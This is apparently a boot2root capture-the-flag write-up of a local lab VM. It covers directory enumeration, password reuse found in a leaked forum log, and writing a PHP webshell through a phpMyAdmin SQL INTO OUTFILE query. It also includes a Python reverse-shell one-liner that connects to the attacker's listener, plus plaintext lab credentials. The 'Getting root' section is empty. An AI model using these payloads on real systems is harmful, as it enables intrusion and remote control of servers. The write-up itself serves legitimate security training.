# boot2root

## Getting code execution
I didnt had nmap installed at first so i went on checking common ports:
- 21 ftp
- 22 ssh
- 80 http
- 443 https

Could not login as anonymous to the ftp server.  
http returned a page with no info what so ever so i fired up gobuster and runned it:
```
$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.56.102
/forum                (Status: 403) [Size: 287]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.56.102/fonts/]
/server-status        (Status: 403) [Size: 295]
$ gobuster dir -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://192.168.56.102
/forum                (Status: 301) [Size: 318] [--> https://192.168.56.102/forum/]
/webmail              (Status: 301) [Size: 320] [--> https://192.168.56.102/webmail/]
/phpmyadmin           (Status: 301) [Size: 323] [--> https://192.168.56.102/phpmyadmin/]
/server-status        (Status: 403) [Size: 296]
```

The /forum is a `my little forum` forum, we get many dummy post and what seems like a snippet of the machine syslog.  
As usual we get many unsucessful ssh login attempt etc... but one user managed to log in: lmezard (and admin).  
Right above we see an unsucessfull login attempt as user `!q\]Ej?*5K5cy*AJ` since the post originated from lmezard and is title `Probleme login ?` we deduced it's related to this unsucessfull login attempt.  
My guess is that the user inputed his password instead of his login and well it is the case since we are able to login with `lmezard/!q\]Ej?*5K5cy*AJ`.  
Going into the `my little forum` lmezard account we get an email wich we can use to login to the webmail server (same password) `laurie@borntosec.net/!q\]Ej?*5K5cy*AJ`  
On the server mail we get credentials wich we can use to login into the phpmyadmin website: `root/Fg-'kKXBj87E:aJ$`  
With phpmyadmin we can do an sql request to create a php file to get a webshell (into a reverse shell (didnt manage to get the reverse shell directly).  
Go to phpmyadmin, select `forum_db` database, click on sql, paste the following payload and click `Go`.  
```
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/webshell.php'
```

phpmyadmin directory seems readonly so i choose this directory that clearly seems writeable by it's content
Then we can access `https://192.168.56.102/forum/templates_c/webshell.php` and input command.  
A quick `python -c "print 'A'" confirmed me that python was installed and so we could do a reverse shell by pasting the following command and listening on port 8000 on our end:
```
$ export RHOST="192.168.56.1";export RPORT=8000;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
```
$ nc -lnvp 8000
```

As expected we are www-data and have now a shell.  
// lol The command execution part is now finished (there is a file in /home directory (/home/LOOKATME/password) wich contains lmezard ssh creds

## Getting root


